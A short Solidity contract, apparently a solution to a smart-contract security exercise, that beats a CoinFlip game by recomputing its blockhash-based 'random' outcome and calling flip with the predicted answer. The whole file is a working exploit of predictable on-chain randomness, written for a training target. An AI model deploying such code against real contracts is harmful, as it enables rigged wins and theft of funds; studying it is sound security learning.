pragma solidity ^0.6.0;

import "../../../Exercise/Stage1/3/CoinFlip.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';

contract AttackConFlip {
    using SafeMath for uint256;
    CoinFlip private coinFlip;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip coinFlipAddress) public{
        coinFlip = coinFlipAddress;
    }

    function attack() external {
        bool flipValue = uint256(blockhash(block.number.sub(1))).div(FACTOR) == 1;
        bool success =coinFlip.flip(flipValue);
        require(success, "Attempt Failed");
    }


}
